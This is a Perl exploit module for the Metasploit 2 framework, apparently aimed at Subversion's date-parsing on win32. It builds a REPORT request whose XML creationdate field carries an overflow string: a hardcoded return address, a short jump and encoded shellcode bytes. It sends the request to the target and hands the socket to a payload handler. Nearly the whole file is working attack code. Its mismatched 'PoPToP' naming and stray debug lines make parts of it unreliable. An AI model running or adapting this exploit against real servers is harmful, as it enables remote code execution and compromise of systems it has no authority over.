package Msf::Exploit::subversion_date_win32;
use strict;
use base 'Msf::Exploit';
use Pex::x86;
use Pex::Utils;
use Unicode::MapUTF8 qw(from_utf8);

my $info = {
  'Name'    => 'PoPToP Negative Read Overflow',
  'Version'  => '$Revision$',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'win32' ],
  'Priv'    => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The poptop port', 80],
      'URL'   => [1, 'DATA', 'URL', '/svn/spoonm'],
    },
  'Payload' =>
    {
      'Space'     => 425 - 64, # We override this to do it dynamically
       'BadChars' => "\x00\x09\x0a\x0b\x0c\x0d\x20><&",
#      'PrependEncoder'   => "\x81\xC4\xC0\xFB\xFF\xFF", # add esp,0xfffffbc0 (-1088)
      'MinNops'   => 0,
      'MaxNops'   => 0,
    },
  'Nop' =>
    {
      'BadRegs' => ['esp', 'ebp'],
    },
  'Description'  =>  
        'to take a more complicated vector and avoid the close.',
  'Refs'  =>
    [
    ],
  'DefaultTarget' => 0,
  'Targets' =>
    [
      ['Bruteforce', ''],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info,}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;


  my $url = $self->GetVar('URL');
  my $ret = 0x77e2db73;
#  my $ret = 0x41414141;

  my $day = "\xc0" . Pex::x86::JmpShort(65) . "A";
  $day .= pack('V', $ret) x 16;
#  $day .= "\x33\xd2\x33\xc0\xbb\x90\x50\x90\x50\xb0\x08\x42\x8b\xc8\x41\x60\x8d\x14\x0a\xcd\x2e\x3c\x05\x61\x74\xf1\xe2\xf3\x42\x39\x1a\x75\xeb\x39\x5a\x04\x75\xe6\xff\xe2";
$day .=
"\xcc\x56\x54\x58\x36\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48\x50\x68".
"\x59\x41\x41\x51\x68\x5a\x59\x59\x59\x59\x41\x41\x51\x51\x44\x44".
"\x44\x64\x33\x36\x46\x46\x46\x46\x54\x58\x56\x6a\x30\x50\x50\x54".
"\x55\x50\x50\x61\x33\x30\x31\x30\x38\x39\x4f\x49\x49\x49\x49\x49".
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x43\x43\x44\x4d\x43\x33".
"\x42\x4c\x4b\x4b\x42\x59\x42\x45\x42\x49\x42\x55\x42\x4b\x4a\x30".
"\x44\x54\x4b\x38\x4a\x4c\x41\x44\x42\x46\x4d\x48\x46\x51\x4c\x30".
"\x4d\x4c\x50\x32\x4e\x43\x45\x30\x41\x46\x46\x47\x41\x4f\x44\x4e".
"\x43\x4f\x44\x34\x49\x33\x4c\x31\x45\x47\x4b\x4e\x49\x43\x4c\x45".
"\x46\x30\x45\x57\x48\x4e\x4f\x4f\x44\x4e\x5a";
#$day = from_utf8({'-string' => $day, '-charset', 'ISO-8859-1'});


my $header = "\x90\x50\x90\x50\x90\x50\x90\x50" . $shellcode;
#  $day = to_utf8({ -string => $day, -charset => 'ISO-8859-1'});
#  $day = "<![CDATA[$day]]>";
#  $day = "A";

  my $evil = "$day 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off)";

  my $post = qq{<?xml version="1.0" encoding="utf-8"?><S:dated-rev-report xmlns:S="svn:" xmlns:D="DAV:"><D:creationdate>$evil</D:creationdate></S:dated-rev-report>};
  my $postLength = length($post);

my $payload = qq{REPORT $url HTTP/1.1\r
Host: $targetHost\r
User-Agent: SVN/1.0.2 (r9423) neon/0.24.5\r
Content-Length: $postLength\r
Content-Type: text/xml\r
Xml-Data: $header
\r
} . $post;

  my $sock = Msf::Socket->new;
  if(!$sock->Tcp($targetHost, $targetPort, $self->GetVar('CPORT')) || $sock->IsError) {
    $sock->PrintError;
    return;
  }

  open(OUTFILE, '>sadness');
  print OUTFILE $payload;
  close(OUTFILE);

  print Pex::Utils::BufferC("$payload");
  $self->PrintLine(sprintf("Trying %#08x", $ret));
  $sock->Send($payload);
  print $sock->Recv(-1);


#    select(undef, undef, undef, $bruteWait); # ghetto sleep
  $self->Handler($sock);
  $sock->Close;
  return;
}

1;
